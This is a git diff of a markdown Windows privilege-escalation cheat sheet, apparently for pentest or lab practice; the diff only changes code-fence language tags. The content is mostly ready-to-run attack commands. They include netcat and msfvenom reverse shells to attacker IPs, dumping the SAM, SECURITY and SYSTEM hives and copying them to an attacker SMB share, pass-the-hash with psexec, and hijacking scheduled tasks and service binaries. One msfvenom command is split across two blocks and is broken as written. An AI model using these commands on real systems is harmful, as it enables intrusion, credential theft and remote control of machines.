@@ -1,53 +1,53 @@
 ## Enumeration
 ### Get hostname of target machine
-```nix
+```cmd
 hostname
 ```
 ### Get system information
-```nix
+```cmd
 systeminfo
 ```
 ### View Windows updates and security patches
-```nix
+```cmd
 wmic qfe get Caption,Description,HotFixID,InstalledOn
 ```
 ### View installed programs and software
-```nix
+```cmd
 wmic product get name,version,vendor
 ```
 ### View current user's privileges
-```nix
+```cmd
 whoami /priv
 ```
 ### View current user's group membership
-```nix
+```cmd
 whoami /groups
 ```
 ### Get user's information
-```nix
+```cmd
 net user username
 ```
 ### Get all system users
-```nix
+```cmd
 net users
 ```
-```nix
+```cmd
 dir /b /ad "C:\\Users\\"
 ```
 Windows XP and below
-```nix
+```cmd
 dir /b /ad "C:\\Documents and Settings\\"
 ```
 ### View other logged in users
-```nix
+```cmd
 qwinsta
 ```
 ### View status of active Windows services and drivers
-```nix
+```cmd
 sc query
 ```
 ### View a Windows service configuration
-```nix
+```cmd
 sc qc [APP NAME]
 ```
 The associated executable is specified through the **BINARY_PATH_NAME** parameter, and the account used to run the service is shown on the **SERVICE_START_NAME** parameter
@@ -64,45 +64,45 @@ cat (Get-PSReadlineOption).HistorySavePath
 ```
 ### Check for AlwaysInstallElevated privileges
 Value of `0x1` means AlwaysInstallElevated is enabled
-```powershell
+```cmd
 REG QUERY HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer
 ```
-```powershell
+```cmd
 REG QUERY HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer
 ```
 ### Check for saved windows credentials
-```powershell
+```cmd
 cmdkey /list
 ```
 ### Check .NET Version
-```nix
+```cmd
 REG QUERY "HKLM\\SOFTWARE\\Microsoft\\Net Framework Setup\\NDP"
 ```
 ### Check for IIS configuration
-```nix
+```cmd
 type C:\\inetpub\\wwwroot\\web.config | findstr connectionString
 ```
-```nix
+```cmd
 type C:\\Windows\\Microsoft.NET\\Framework64\\[VERSION]\\Config\\web.config | findstr connectionString
 ```
 ### Check for PuTTY credentials
-```nix
+```cmd
 REG QUERY HKEY_CURRENT_USER\\Software\\SimonTatham\\PuTTY\\Sessions\\ /f "Proxy" /s
 ```
 ### Check for scheduled tasks
-```nix
+```cmd
 schtasks /query /tn TASK_NAME /fo list /v
 ```
 ### Check scheduled tasks permissions
-```nix
+```cmd
 icacls C:\\Tasks\\schtask.bat
 ```
 ### Check for running tasks
-```powershell
+```cmd
 tasklist /svc
 ```
 ### Look for specific task
-```powershell
+```cmd
 tasklist /svc /i TASK_NAME
 ```
 ### Using automated scripts
@@ -114,83 +114,83 @@ Set-ExecutionPolicy Bypass -Scope CurrentUser
 ```
 ### Abuse SeImpersonatePrivilege
 Download [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) to the target machine and run the following command. Only applicable in Windows 10 and Server 2016/2019.
-```nix
+```cmd
 PrintSpoofer.exe -i -c cmd
 ```
 For older versions such as Windows 2000/XP/Vista and Server 2003/2008. Download [Churrasco](https://github.com/Re4son/Churrasco) to target machine and run the following command.
-```nix
+```cmd
 churrasco.exe "nc.exe 10.10.10.10 5555 -e cmd"
 ```
 ### Abuse AlwaysInstallElevated privilege
 Generate reverse shell using `msfvenom`. Host the reverse shell and download it from the target machine
-```nix
+```bash
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 lport=4444 -f 
 ```
-```nix
+```cmd
 msi -o reverse.msi
 ```
 Execute the reverse shell by installing the malicious installer package. A netcat listener must be active on the attack machine.
-```nix
+```cmd
 msiexec /quiet /qn /i C:\\Windows\\Temp\\reverse.msi
 ```
 ### Abuse SeBackup / SeRestore to dump SAM, SECURITY, and SYSTEM hashes
 Get a copy of the SYSTEM, SECURITY and SAM hives and download them back to your machine
-```nix
+```cmd
 REG SAVE HKLM\\SAM C:\\Temp\\sam.save
 ```
-```nix
+```cmd
 REG SAVE HKLM\\SECURITY C:\\Temp\\security.save
 ```
-```nix
+```cmd
 REG SAVE HKLM\\SYSTEM C:\\Temp\\system.save
 ```
 Run a SMBServer and transfer files back to your machine
-```nix
+```bash
 # Make sure you run `mkdir share` if the folder doesn't exists
 impacket-smbserver -smb2support -username username -password password public share
 ```
 Transfer copy of the SYSTEM, SECURITY and SAM hives to your machine
-```nix
+```cmd
 # 10.10.10.10 is our (attacker) IP
 copy C:\\Temp\\sam.save \\\\10.10.10.10\\public
 ```
-```nix
+```cmd
 # 10.10.10.10 is our (attacker) IP
 copy C:\\Temp\\security.save \\\\10.10.10.10\\public
 ```
-```nix
+```cmd
 # 10.10.10.10 is our (attacker) IP
 copy C:\\Temp\\system.save \\\\10.10.10.10\\public
 ```
 Retrieve user password hashes
-```nix
+```bash
 impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
 ```
 Login as the new elevated user
-```nix
+```bash
 impacket-psexec -hashes [HASH] username@10.10.10.10
 ```
 ### Abuse SeTakeOwnership
-```nix
+```cmd
 takeown /f C:\\inetpub\\wwwwroot\\web.config
 ```
-```nix
+```cmd
 icacls C:\\inetpub\\wwwwroot\\web.config /grant attacker:F
 ```
 ### Abuse saved Windows credentials
-```nix
+```cmd
 runas /savecred /user:[USERNAME] cmd.exe
 ```
 ### Abuse scheduled tasks write permissions
-```nix
+```cmd
 echo C:\\Tools\\nc64.exe -e cmd.exe 10.10.10.10 4444 > C:\\Tasks\\schtask.bat
 ```
-```nix
+```cmd
 # Force run the scheduled task
 schtasks /run /tn [TASK NAME]
 ```
 ### Abuse insecure permission on Windows service executable
-```nix
+```cmd
 C:\\> sc qc WindowsScheduler
 [SC] QueryServiceConfig SUCCESS
 
@@ -206,7 +206,7 @@ SERVICE_NAME: windowsscheduler
         SERVICE_START_NAME : .\\svcuser1
 ```
 We can see that the service installed by the vulnerable software runs as svcuser1 and the executable associated with the service is in `C:\\Progra~2\\System~1\\WService.exe`. We then proceed to check the permissions on the executable:
-```nix
+```cmd
 C:\\Users\\thm-unpriv>icacls C:\\PROGRA~2\\SYSTEM~1\\WService.exe
 C:\\PROGRA~2\\SYSTEM~1\\WService.exe Everyone:(I)(M)
                                   NT AUTHORITY\\SYSTEM:(I)(F)
@@ -218,12 +218,12 @@ C:\\PROGRA~2\\SYSTEM~1\\WService.exe Everyone:(I)(M)
 Successfully processed 1 files; Failed processing 0 files
 ```
 Let's generate an exe-service payload using msfvenom, serve it through a python webserver, and download it to the target machine.
-```nix
+```bash
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
 ```
 ### Abuse unquoted service paths
 When working with Windows services, a very particular behaviour occurs when the service is configured to point to an "unquoted" executable. By unquoted, we mean that the path of the associated executable isn't properly quoted to account for spaces on the command.
-```nix
+```cmd
 C:\\> sc qc "disk sorter enterprise"
 [SC] QueryServiceConfig SUCCESS
 
@@ -252,16 +252,16 @@ Instead of failing as it probably should, SCM tries to help the user and starts 
 2. If the latter doesn't exist, it will then search for `C:\MyPrograms\Disk Sorter.exe`. If it exists, the service will run this executable.
 3. If the latter doesn't exist, it will then search for `C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe`. This option is expected to succeed and will typically be run in a default installation.
 Let's generate an exe-service payload using msfvenom, serve it through a python webserver, and download it to the target machine.
-```nix
+```bash
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
 ```
-```nix
+```cmd
 C:\> move C:\Temp\rev-svc.exe C:\MyPrograms\Disk.exe
 
 C:\> icacls C:\MyPrograms\Disk.exe /grant Everyone:F
         Successfully processed 1 files.
 ```
-```nix
+```cmd
 C:\> sc stop "disk sorter enterprise"
 C:\> sc start "disk sorter enterprise"
 ```
